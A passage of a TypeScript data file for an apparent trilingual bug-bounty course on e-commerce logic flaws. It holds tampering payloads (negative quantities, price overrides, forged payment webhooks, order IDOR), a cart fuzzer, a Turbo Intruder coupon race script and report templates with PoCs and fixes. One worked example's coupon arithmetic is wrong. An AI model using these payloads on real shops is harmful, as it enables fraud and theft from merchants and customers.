      en: "Check the order tracking URL! Many platforms send an unauthenticated tracking link via SMS (`/track/ORD-9912`). Often this tracking page leaks the full order payload, customer phone, and shipping address without requiring any login!",
      simple: "SMS tracking links often show the full address and phone number to anyone with the link!",
      hi: "SMS में आने वाले ट्रैकिंग लिंक को बिना लॉगिन किए इनकॉग्निटो विंडो में खोलें। कई बार वह पूरा नाम, पता और फोन नंबर बिना पासवर्ड के दिखा देता है!",
    },
  },
  {
    id: "refund-loyalty-arbitrage",
    title: {
      en: "Fraudulent Return, Refund & Loyalty Points Arbitrage",
      simple: "Infinite Reward Points & Negative Quantity Returns",
      hi: "रिफंड फ्रॉड और लॉयल्टी पॉइंट्स का इनफिनिट लूप",
    },
    cwe: "CWE-840: Business Logic Errors",
    vrt: "Business Logic Flaws › Financial / Reward Points Arbitrage",
    bountyRange: "$2,000 – $9,000 (P2 High)",
    severity: "high",
    summary: {
      en: "Loyalty programs award instant reward points, cashback, or referral balances upon placing an order. Flawed business logic allows attackers to place an order, claim or transfer the cashback reward, and then immediately cancel the order for a 100% full refund without the reward points being clawed back, resulting in an infinite money duplication loop.",
      simple: "You buy an item and get $10 cashback points immediately. You spend that $10 on another purchase, then cancel your first order to get your original money back. You keep the free $10 and repeat forever!",
      hi: "सामान खरीदने पर तुरंत ₹500 का कैशबैक मिलता है। उस कैशबैक को खर्च कर लें, और फिर ओरिजिनल सामान कैंसिल करके पूरे पैसे वापस ले लें। ₹500 मुफ्त में मिल जाते हैं।",
    },
    scenarios: [
      {
        title: {
          en: "Order Cancellation After Instant Loyalty Points Extraction",
          simple: "Getting Full Refund While Keeping Free Cash Points",
          hi: "कैशबैक खर्च करने के बाद आर्डर कैंसिल करके पूरे पैसे वापस लेना",
        },
        description: {
          en: "Attacker purchases a $1,000 product which credits 1,000 loyalty points ($100 value) instantly. Attacker converts points into a digital gift card, then cancels the $1,000 order before dispatch. The system refunds $1,000 to the original credit card without checking or deducting the negative points balance.",
          simple: "Collect instant cashback, spend it, and cancel the main order for 100% refund.",
          hi: "तुरंत मिले रिवॉर्ड पॉइंट्स को खर्च करें और फिर आर्डर कैंसिल करके पूरे पैसे वापस पा लें।",
        },
        requestSample: `POST /api/v1/orders/ORD-9912/cancel HTTP/1.1
Host: target.com
Content-Type: application/json

{"reason": "Changed mind", "refund_destination": "ORIGINAL_PAYMENT_METHOD"}`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{"status": "CANCELLED", "refund_amount": 1000.00, "points_clawed_back": 0}`,
        impact: {
          en: "High (P2): Systematic drain of company funds through infinite reward loops.",
          simple: "Free money loop through loyalty reward flaws.",
          hi: "लॉयल्टी रिवॉर्ड्स से कंपनी के पैसों का सीधा नुकसान।",
        },
      },
      {
        title: {
          en: "Partial Return Refund Calculation Discrepancy",
          simple: "Returning 1 Item from a 'Buy 1 Get 1 Free' to Profit",
          hi: "बाय 1 गेट 1 फ्री वाले ऑफर में से 1 आइटम लौटाकर मुनाफा कमाना",
        },
        description: {
          en: "A store runs 'Buy One Get One Free' (Total $100 for two items, $50 each effective). During return, the system looks up the individual product price ($100) instead of the discounted bundle price, refunding the full $100 while allowing the user to keep the second item.",
          simple: "Return the paid item from a BOGO deal and get the full price refunded while keeping the free gift.",
          hi: "ऑफर में मिले दो सामानों में से एक वापस करके पूरे पैसे वापस ले लेना और दूसरा सामान मुफ्त रख लेना।",
        },
        requestSample: `POST /api/v1/returns/create HTTP/1.1
Host: target.com
Content-Type: application/json

{"order_id": "ORD-BOGO-11", "returned_item_id": "ITEM_1", "quantity": 1}`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{"refund_approved": 100.00, "method": "BANK_TRANSFER"}`,
        impact: {
          en: "High/Medium: Fraudulent profit from flawed bundle refund calculations.",
          simple: "Free items through bundle return flaws.",
          hi: "रिफंड कैलकुलेटर में गड़बड़ी से मुफ्त सामान।",
        },
      },
    ],
    testingRecipe: [
      {
        en: "Test the order cancellation workflow: observe whether reward points, referral bonuses, or coupons are revoked upon cancellation.",
        simple: "Check if points are taken back when you cancel an order.",
        hi: "देखें कि आर्डर कैंसिल करने पर क्या रिवॉर्ड पॉइंट्स वापस लिए जाते हैं।",
      },
      {
        en: "Test partial refunds on multi-item and coupon-discounted orders.",
        simple: "Test returning part of a discounted bundle.",
        hi: "डिस्काउंट वाले आर्डर में से एक सामान वापस करके रिफंड अमाउंट देखें।",
      },
      {
        en: "Test wallet double-spending: use wallet credits on two orders simultaneously using single-packet race conditions.",
        simple: "Spend wallet balance on two checkouts at the same instant.",
        hi: "वॉलेट बैलेंस को रेस कंडीशन से दो ऑर्डर्स में एक साथ खर्च करके देखें।",
      },
    ],
    burpRules: [
      "Turbo Intruder: Double spend wallet credits on two orders simultaneously",
    ],
    hunterProTip: {
      en: "Check if returns accept negative quantities! Submitting `quantity: -1` in a return request has historically caused billing systems to charge the merchant and send cash straight to the buyer's bank account!",
      simple: "Try returning quantity: -1. In flawed systems, this adds money to your refund!",
      hi: "रिटर्न रिक्वेस्ट में क्वांटिटी -1 डालकर देखें। कई बार सिस्टम उल्टा आपके अकाउंट में पैसे भेज देता है!",
    },
  },
];

// ─── 2. 5-PHASE E-COMMERCE BUG HUNTING METHODOLOGY ───────────────────────────
export const ECOMMERCE_METHODOLOGY_PHASES: EcommercePhase[] = [
  {
    phase: 1,
    title: {
      en: "Phase 1: Catalog, Cart & Currency Mechanics Recon",
      simple: "Phase 1: Testing Prices, Quantities and Cart Calculations",
      hi: "चरण 1: कैटलॉग, कार्ट और करेंसी कैलकुलेशन की जांच",
    },
    objective: {
      en: "Map out cart creation, item addition, quantity updates, and currency conversions; test parameter tampering on prices and quantities.",
      simple: "Test if you can change prices, use negative numbers, or switch currencies in your cart.",
      hi: "कार्ट में सामान डालते वक्त कीमत, क्वांटिटी और करेंसी बदलने का परीक्षण करें।",
    },
    steps: [
      {
        en: "Capture `/cart/add`, `/cart/update`, and `/cart/checkout` requests in Burp Suite.",
        simple: "Capture all cart requests in Burp.",
        hi: "Burp में कार्ट के सारे रिक्वेस्ट कैप्चर करें।",
      },
      {
        en: "Fuzz `quantity` parameter with `-1`, `0`, `0.1`, `999999999`, and array values `[1, -1]`.",
        simple: "Test negative and decimal numbers in quantity.",
        hi: "क्वांटिटी में -1, 0, 0.1 और बड़े नंबर्स डालकर देखें।",
      },
      {
        en: "Fuzz `price`, `unit_price`, and `total` parameters with `0.01`, `0`, and `-10`.",
        simple: "Test changing product prices to 0.01.",
        hi: "प्रोडक्ट की कीमत 0.01 या 0 करके देखें।",
      },
      {
        en: "Switch currencies (USD -> JPY, INR, VND) right before checkout to detect 1:1 conversion bugs.",
        simple: "Change currency code to JPY or VND at checkout.",
        hi: "चेकआउट पर करेंसी बदलकर देखें कि क्या 1:1 पर चार्ज होता है।",
      },
    ],
    commandsOrPayloads: [
      `POST /api/cart/items -d '{"product_id":"123","quantity":-1}'`,
      `PATCH /api/cart/items/456 -d '{"unit_price":0.01}'`,
      `POST /api/checkout/currency -d '{"currency":"JPY"}'`,
    ],
    keyTargets: [
      "Negative item quantities",
      "Direct unit price tampering",
      "Currency 1:1 conversion discrepancies",
      "Cart subtotal recalculation logic",
    ],
  },
  {
    phase: 2,
    title: {
      en: "Phase 2: Promo Codes, Gift Cards & Loyalty Logic",
      simple: "Phase 2: Testing Coupon Race Conditions and Infinite Stacking",
      hi: "चरण 2: प्रोमो कोड, गिफ्ट कार्ड और डिस्काउंट रेस कंडीशन",
    },
    objective: {
      en: "Audit discount validation, referral rewards, gift voucher redemption, and concurrency protections.",
      simple: "Test if coupons can be used multiple times in parallel or combined illegally.",
      hi: "देखें कि क्या कूपन को एक साथ कई बार लगाया जा सकता है या गिफ्ट कार्ड डबल खर्च हो सकता है।",
    },
    steps: [
      {
        en: "Obtain a single-use coupon and configure an HTTP/2 Single-Packet Attack in Turbo Intruder.",
        simple: "Send the single-use coupon 30 times at once using Turbo Intruder.",
        hi: "Turbo Intruder से सिंगल-पैकेट रेस कंडीशन चलाकर कूपन टेस्ट करें।",
      },
      {
        en: "Test coupon stacking: apply mutually exclusive discount codes across multiple browser tabs.",
        simple: "Try applying two different coupons across separate tabs.",
        hi: "दो अलग-अलग कूपन एक साथ लगाकर देखें।",
      },
      {
        en: "Test concurrent gift card redemption across two active carts simultaneously.",
        simple: "Redeem the same gift card on two checkouts at the same second.",
        hi: "एक ही गिफ्ट कार्ड दो अलग कार्ट्स में एक साथ भुनाएं।",
      },
    ],
    commandsOrPayloads: [
      `engine.openGate('coupon_race')`,
      `POST /api/cart/apply-coupon -d '{"code":"WELCOME50"}'`,
    ],
    keyTargets: [
      "Coupon concurrency (Single-Packet Attack)",
      "Gift card double-spend race condition",
      "Referral bonus duplication",
    ],
  },
  {
    phase: 3,
    title: {
      en: "Phase 3: Checkout, Gateway & Webhook Verification",
      simple: "Phase 3: Testing Fake Payments and Webhook Signature Bypasses",
      hi: "चरण 3: चेकआउट, पेमेंट गेटवे और वेबहुक वेरिफिकेशन",
    },
    objective: {
      en: "Inspect payment gateway integration, webhook HMAC verification, and return URL redirect handling.",
      simple: "See if you can fake successful payments or bypass payment verification.",
      hi: "जांचें कि क्या बिना पैसे चुकाए फर्जी पेमेंट कन्फर्म कराई जा सकती है।",
    },
    steps: [
      {
        en: "Locate webhook URLs (`/api/webhooks/stripe`, `/payment/callback`, `/ipn`).",
        simple: "Find payment webhook URLs.",
        hi: "पेमेंट वेबहुक और कॉलबैक URLs ढूंढें।",
      },
      {
        en: "Send forged `payment.succeeded` events with missing or randomized signature headers.",
        simple: "Send fake payment success messages without signatures.",
        hi: "बिना सिग्नेचर के फर्जी पेमेंट सक्सेस का मैसेज भेजें।",
      },
      {
        en: "Cancel payment at the banking screen and alter redirect parameters from `failed` to `success`.",
        simple: "Change failed to success in the redirect link after cancelling payment.",
        hi: "पेमेंट कैंसिल करके रीडायरेक्ट लिंक में failed को success बनाएं।",
      },
      {
        en: "Inspect JS bundles for hardcoded payment gateway test keys (`pk_test_...`).",
        simple: "Check JS files for test payment keys.",
        hi: "JS फाइल्स में टेस्ट पेमेंट कीज (pk_test_) ढूंढें।",
      },
    ],
    commandsOrPayloads: [
      `POST /api/webhooks/payment -d '{"event":"charge.success","order_id":"123"}'`,
      `GET /checkout/callback?status=success&tx_id=test`,
    ],
    keyTargets: [
      "Webhook HMAC signature validation",
      "Client-side payment state trust",
      "Order status mass assignment (status=PAID)",
    ],
  },
  {
    phase: 4,
    title: {
      en: "Phase 4: Order Management, Invoices & Address IDOR",
      simple: "Phase 4: Stealing Other People's Packages and Downloading Invoices",
      hi: "चरण 4: ऑर्डर IDOR, इनवॉइस लीक और डिलीवरी एड्रेस हाईजैकिंग",
    },
    objective: {
      en: "Identify horizontal privilege escalation and IDOR flaws across orders, tracking links, and customer PII.",
      simple: "Check if you can view other customers' orders or change their delivery address.",
      hi: "दूसरे ग्राहकों के ऑर्डर देखने और उनका डिलीवरी एड्रेस बदलने की जांच करें।",
    },
    steps: [
      {
        en: "Create two test accounts and place orders on each to collect two distinct order IDs.",
        simple: "Create 2 accounts and place orders to get two order numbers.",
        hi: "दो अकाउंट्स से आर्डर करके दो अलग आर्डर आईडी लें।",
      },
      {
        en: "Access `/orders/{id}`, `/invoices/{id}.pdf`, and `/receipts/{id}` across accounts.",
        simple: "Try downloading Account B's invoice using Account A's login.",
        hi: "अकाउंट A से लॉगिन करके अकाउंट B का इनवॉइस डाउनलोड करें।",
      },
      {
        en: "Attempt modifying shipping address on in-flight orders via `PUT /orders/{id}/address`.",
        simple: "Try updating the shipping address of Account B's order.",
        hi: "अकाउंट B के आर्डर में अपना डिलीवरी एड्रेस डालकर देखें।",
      },
      {
        en: "Inspect SMS/Email tracking links for unauthenticated PII disclosure.",
        simple: "Open tracking links without logging in to see if full address leaks.",
        hi: "ट्रैकिंग लिंक खोलकर देखें कि क्या पूरा पता बिना पासवर्ड के दिख रहा है।",
      },
    ],
    commandsOrPayloads: [
      `GET /api/orders/10042/invoice.pdf`,
      `PUT /api/orders/10042/address -d '{"zip":"90210"}'`,
    ],
    keyTargets: [
      "Invoice and receipt PDF IDOR",
      "In-flight shipping address hijacking",
      "Unauthenticated order tracking PII leak",
    ],
  },
  {
    phase: 5,
    title: {
      en: "Phase 5: Post-Purchase Returns, Refunds & Loyalty Arbitrage",
      simple: "Phase 5: Free Money Loops via Returns and Cashback Abuse",
      hi: "चरण 5: रिफंड फ्रॉड और लॉयल्टी पॉइंट्स का इनफिनिट लूप",
    },
    objective: {
      en: "Examine cancellation, return, and refund workflows to detect balance duplication and clawback omissions.",
      simple: "Check if you can cancel an order, get full money back, but keep free cashback points.",
      hi: "जांचें कि क्या आर्डर कैंसिल करके पूरे पैसे वापस मिल जाते हैं और कैशबैक भी नहीं कटता।",
    },
    steps: [
      {
        en: "Place an order that awards instant cashback/points, spend the cashback, then cancel the original order.",
        simple: "Spend the instant reward points and cancel the main order for 100% refund.",
        hi: "कैशबैक खर्च करें और फिर ओरिजिनल आर्डर कैंसिल करके पूरे पैसे वापस पाएं।",
      },
      {
        en: "Test partial returns on discounted multi-item bundles.",
        simple: "Return one item from a buy-one-get-one deal.",
        hi: "डिस्काउंट वाले बंडल में से एक सामान वापस करके रिफंड चेक करें।",
      },
      {
        en: "Test return requests with negative quantities (`qty: -1`).",
        simple: "Try submitting quantity -1 in return requests.",
        hi: "रिटर्न फॉर्म में क्वांटिटी -1 डालकर देखें।",
      },
    ],
    commandsOrPayloads: [
      `POST /api/orders/9912/cancel`,
      `POST /api/returns -d '{"item_id":"1","quantity":-1}'`,
    ],
    keyTargets: [
      "Loyalty points clawback omissions",
      "Bundle discount partial return errors",
      "Negative return quantity abuse",
    ],
  },
];

// ─── 3. AUTOMATION SCRIPTS & TOOLS STASH ──────────────────────────────────────
export const ECOMMERCE_TOOLS_STASH: EcommerceToolSnippet[] = [
  {
    id: "ecommerce-cart-fuzzer",
    title: {
      en: "Automated E-Commerce Cart & Price Parameter Fuzzer",
      simple: "Python Script to Test Negative Quantities and Price Tampering",
      hi: "ई-कॉमर्स कार्ट और प्राइस पैरामीटर फ़ज़र (पायथन स्क्रिप्ट)",
    },
    description: {
      en: "Automates testing for negative quantities, sub-cent floating point pricing, zero-dollar carts, and currency switching discrepancies across cart and checkout endpoints.",
      simple: "A Python tool that tests your cart with negative numbers, 1-cent prices, and different currencies automatically.",
      hi: "यह टूल कार्ट में ऑटोमेटिक नेगेटिव क्वांटिटी, 1 पैसे की कीमत और करेंसी बदलकर बग्स ढूंढता है।",
    },
    category: "python_fuzzer",
    language: "python",
    code: `#!/usr/bin/env python3
"""
E-Commerce Cart Parameter & Price Manipulation Fuzzer
Tests negative quantities, decimal prices, and currency arbitrage.
"""

import requests
import json
import sys

def test_cart_tampering(cart_url, cookie, product_id):
    headers = {
        "Content-Type": "application/json",
        "Cookie": cookie,
        "User-Agent": "Mozilla/5.0 (E-Commerce-Security-Audit)"
    }

    test_payloads = [
        {"name": "Negative Quantity (-1)", "data": {"product_id": product_id, "quantity": -1}},
        {"name": "Zero Quantity (0)", "data": {"product_id": product_id, "quantity": 0}},
        {"name": "Fractional Quantity (0.5)", "data": {"product_id": product_id, "quantity": 0.5}},
        {"name": "Price Override ($0.01)", "data": {"product_id": product_id, "quantity": 1, "unit_price": 0.01}},
        {"name": "Zero Price ($0.00)", "data": {"product_id": product_id, "quantity": 1, "unit_price": 0.00}},
        {"name": "Currency Switch (JPY)", "data": {"product_id": product_id, "quantity": 1, "currency": "JPY"}},
        {"name": "Integer Overflow Quantity", "data": {"product_id": product_id, "quantity": 2147483648}},
    ]

    print(f"[*] Target Cart Endpoint: {cart_url}")
    print(f"[*] Testing Product ID: {product_id}\\n")

    for test in test_payloads:
        try:
            resp = requests.post(cart_url, headers=headers, json=test["data"], timeout=5)
            print(f"[>] Testing: {test['name']}")
            print(f"    Status: {resp.status_code}")
            
            if resp.status_code in [200, 201]:
                body = resp.text.lower()
                if "total" in body or "success" in body or "item" in body:
                    print(f"    \\033[1;32m[!] POTENTIAL VULNERABILITY: Server accepted {test['name']}!\\033[0m")
                    print(f"    Response snippet: {resp.text[:200]}\\n")
            else:
                print(f"    Server rejected ({resp.status_code})\\n")

        except Exception as e:
            print(f"    [!] Request error: {e}\\n")

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <cart_url> <session_cookie> <product_id>")
        print(f"Example: {sys.argv[0]} https://shop.target.com/api/cart/items 'session=abc123' PROD_991")
        sys.exit(1)

    test_cart_tampering(sys.argv[1], sys.argv[2], sys.argv[3])`,
    howToUse: {
      en: "Run: `python3 ecommerce_fuzzer.py https://target.com/api/cart/add 'session=xyz' PROD_123`",
      simple: "Run the script with your cart URL, cookie, and product ID.",
      hi: "`python3 ecommerce_fuzzer.py <कार्ट URL> <कुकी> <प्रोडक्ट ID>` लिखकर चलाएं।",
    },
  },
  {
    id: "turbo-intruder-coupon-race",
    title: {
      en: "Turbo Intruder HTTP/2 Single-Packet Coupon Stacking Script",
      simple: "Turbo Intruder Python Script to Apply Single-Use Coupons 30 Times",
      hi: "Turbo Intruder कूपन रेस कंडीशन स्क्रिप्ट (सिंगल-पैकेट अटैक)",
    },
    description: {
      en: "Python script designed specifically for Burp Suite's Turbo Intruder extension to exploit non-atomic promo code redemptions using HTTP/2 multiplexed streams.",
      simple: "Burp Turbo Intruder script to apply a 50% discount coupon 30 times in the same millisecond.",
      hi: "Burp Turbo Intruder में एक ही कूपन को एक ही मिलीसेकंड में 30 बार लगाने वाली स्क्रिप्ट।",
    },
    category: "turbo_intruder",
    language: "python",
    code: `def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2,
                           requestsPerConnection=100,
                           pipeline=False)

    # 1. Queue 30 identical coupon redemption requests behind a single gate
    for i in range(30):
        engine.queue(target.req, gate='race1')

    # 2. Release all 30 requests concurrently in the exact same TCP packet
    engine.openGate('race1')

def handleResponse(req, category):
    # Highlight successful 200 OK responses or non-error status codes
    if req.status == 200:
        table.add(req)`,
    howToUse: {
      en: "In Burp Suite -> Right-click apply coupon request -> Send to Turbo Intruder -> Paste this script -> Click Attack.",
      simple: "Send coupon request to Turbo Intruder, paste script, and click Attack.",
      hi: "Burp में कूपन रिक्वेस्ट को Turbo Intruder में भेजें, स्क्रिप्ट पेस्ट करें और अटैक स्टार्ट करें।",
    },
  },
];

// ─── 4. HIGH-YIELD BUG BOUNTY REPORT TEMPLATES ───────────────────────────────
export const ECOMMERCE_REPORT_TEMPLATES: EcommerceReportTemplate[] = [
  {
    id: "cart-negative-quantity-p1",
    title: {
      en: "P1 / Critical: Cart Total Manipulation via Negative Quantity Allowing Arbitrary Free Purchases",
      simple: "P1: Negative Quantity Cart Exploit Allowing Free Orders",
      hi: "P1 / क्रिटिकल: नेगेटिव क्वांटिटी से कार्ट बिल जीरो करके मुफ्त खरीदारी",
    },
    vulnType: "Business Logic Flaw / Parameter Tampering",
    cvss: "9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H)",
    severity: "critical",
    reportMarkdown: `## Summary
A critical business logic vulnerability was identified on the checkout workflow of **{TARGET_DOMAIN}**. The server-side cart calculation engine accepts negative values for item quantities in the \`POST /api/v1/cart/items\` endpoint. 

By adding a genuine high-value item alongside an accessory with a negative quantity, an attacker can offset the subtotal of the cart to $0.00 (or $1.00), bypass the payment gateway, and place legitimate confirmed orders for expensive physical merchandise without paying.

## Vulnerability Details
- **Vulnerable Endpoint:** \`POST https://{TARGET_DOMAIN}/api/v1/cart/items\`
- **Vulnerability Type:** CWE-602: Client-Side Enforcement of Server-Side Security
- **Severity:** Critical (P1)
- **Impact:** Direct financial loss, inventory theft, and unauthorized order fulfillment.

## Step-by-Step Proof of Concept (PoC)

1. Log into an account on \`https://{TARGET_DOMAIN}\`.
2. Add any high-value product to your shopping cart (e.g. Product ID \`PROD_LAPTOP_01\` priced at **$1,500.00**, Quantity: 1).
3. Intercept the HTTP request to add a secondary lower-priced item (e.g. Product ID \`PROD_STICKER\` priced at **$10.00**).
4. Modify the quantity parameter from \`1\` to \`-149\` in Burp Suite:

\`\`\`http
POST /api/v1/cart/items HTTP/1.1
Host: {TARGET_DOMAIN}
Content-Type: application/json
Cookie: session_id={SESSION_COOKIE}

{
  "product_id": "PROD_STICKER",
  "quantity": -149
}
\`\`\`

5. Forward the request. The server calculates:
   \`(1 * $1,500.00) + (-149 * $10.00) = $1,500.00 - $1,490.00 = $10.00\`
6. Proceed to the checkout page at \`https://{TARGET_DOMAIN}/checkout\`.
7. Observe that the total amount charged on the payment gateway is only **$10.00** instead of **$1,500.00**.
8. Complete payment: the order is confirmed with order status \`PAID / PROCESSING FOR SHIPMENT\`.

## Impact
An attacker can order unlimited high-value products across the merchant's store catalog for pennies or free, causing immediate financial shrinkage and inventory theft.

## Remediation
1. **Strict Server-Side Quantity Validation:** Enforce that all submitted item quantities are strictly positive integers greater than zero (\`quantity >= 1\`) on both cart addition and cart update endpoints.
2. **Catalog-Sourced Pricing:** Never accept unit prices or subtotals from client-submitted parameters; recalculate the total solely from server-side database records.
3. **Subtotal Assertions:** Enforce a final server-side check before payment capture: ensure the order total matches the sum of catalog prices.`,
  },
  {
    id: "payment-webhook-forgery-p1",
    title: {
      en: "P1 / Critical: Payment Gateway Webhook Forgery via Missing HMAC Signature Verification Leading to Free Orders",
      simple: "P1: Fake Payment Webhooks Accepted Allowing Free Orders",
      hi: "P1 / क्रिटिकल: बिना सिग्नेचर फर्जी वेबहुक से ऑर्डर पेड करवाकर फ्री खरीदारी",
    },
    vulnType: "Insecure Authentication / Webhook Forgery",
    cvss: "9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)",
    severity: "critical",
    reportMarkdown: `## Summary
A critical authentication bypass was identified on the payment gateway integration of **{TARGET_DOMAIN}**. The merchant webhook endpoint at \`/api/webhooks/payment\` processes order completion events without validating the cryptographic HMAC signature header sent by the payment provider.

An attacker can place an order, cancel at the payment stage, and then dispatch a spoofed webhook POST request directly to the merchant backend, marking the order as fully paid and triggering fulfillment.

## Vulnerability Details
- **Vulnerable Endpoint:** \`POST https://{TARGET_DOMAIN}/api/webhooks/payment\`
- **Vulnerability Type:** CWE-347: Improper Verification of Cryptographic Signature
- **Severity:** Critical (P1)

## Proof of Concept

1. Add an item to cart and proceed to checkout to generate a pending order (e.g. \`order_id: ORD-88192\`).
2. When redirected to the payment gateway (Stripe/Razorpay/PayPal), cancel or close the browser tab.
3. Send a forged webhook notification directly to the target endpoint using curl:

\`\`\`bash
curl -X POST "https://{TARGET_DOMAIN}/api/webhooks/payment" \\
  -H "Content-Type: application/json" \\
  -d '{
    "event": "payment.succeeded",
    "data": {
      "order_id": "ORD-88192",
      "amount": 999.00,
      "currency": "USD",
      "status": "PAID"
    }
  }'
\`\`\`

4. The server returns \`HTTP 200 OK\` with \`{"status": "CONFIRMED", "message": "Order dispatched to warehouse"}\`.
5. Check the account order history: order \`ORD-88192\` is now marked as **PAID** and ready for shipment.

## Remediation
1. **Enforce Webhook Signature Verification:** Compute the HMAC SHA-256 signature using the shared webhook secret key and verify against the incoming signature header (e.g. \`Stripe-Signature\`) before processing any payload.
2. **Server-to-Server Verification:** Alternatively, query the payment gateway API directly (\`GET https://api.stripe.com/v1/payment_intents/{id}\`) to verify genuine payment status before fulfilling orders.`,
  },
  {
    id: "coupon-concurrency-race-p2",
    title: {
      en: "P2 / High: Single-Packet Race Condition on Single-Use Discount Coupon Allowing Infinite Stacking",
      simple: "P2: Single-Use Coupon Multi-Redemption via Race Condition",
      hi: "P2 / हाई: रेस कंडीशन से सिंगल-यूज कूपन को कई बार लगाकर भारी डिस्काउंट",
    },
    vulnType: "Business Logic / Race Condition",
    cvss: "7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N)",
    severity: "high",
    reportMarkdown: `## Summary
A race condition vulnerability was identified on the promo code redemption endpoint at \`https://{TARGET_DOMAIN}/api/v1/cart/apply-coupon\`. The backend fails to employ atomic database transactions or row-level locking when validating whether a single-use coupon has already been redeemed.

By synchronizing multiple redemption requests within a single TCP packet using HTTP/2, an attacker can apply a one-time 50% discount coupon multiple times to a single cart, driving the total payable balance down to zero.

## Vulnerability Details
- **Vulnerable Endpoint:** \`POST https://{TARGET_DOMAIN}/api/v1/cart/apply-coupon\`
- **Vulnerability Type:** CWE-362: Race Condition
- **Severity:** High (P2)

## Steps to Reproduce

1. Register a new account to receive a one-time welcome coupon (e.g. \`WELCOME50\` giving 50% discount).
2. Add items worth $400.00 to the cart.
3. Capture the coupon redemption request in Burp Suite:
\`\`\`http
POST /api/v1/cart/apply-coupon HTTP/2
Host: {TARGET_DOMAIN}
Content-Type: application/json

{"coupon_code": "WELCOME50"}
\`\`\`
4. Send the request to Turbo Intruder and execute a single-packet synchronized attack with 30 requests.
5. Multiple threads evaluate \`coupon.is_used == false\` simultaneously before any thread can flag it as consumed.
6. The coupon applies 4 times successively:
   - Initial: $400.00
   - Pass 1: $200.00
   - Pass 2: $100.00
   - Pass 3: $50.00
   - Pass 4: $0.00 (Free order)
7. Proceed to checkout and confirm the order for $0.00.

## Remediation
1. **Atomic Database Locking:** Use atomic conditional updates in the database: \`UPDATE coupons SET is_used = TRUE WHERE code = 'WELCOME50' AND is_used = FALSE\`. If the affected rows count is 0, reject the redemption.
2. **Distributed Redis Locks:** Acquire a distributed mutex lock (e.g. Redlock) on \`{user_id}:{coupon_code}\` for the duration of the coupon redemption process.`,
  },
];
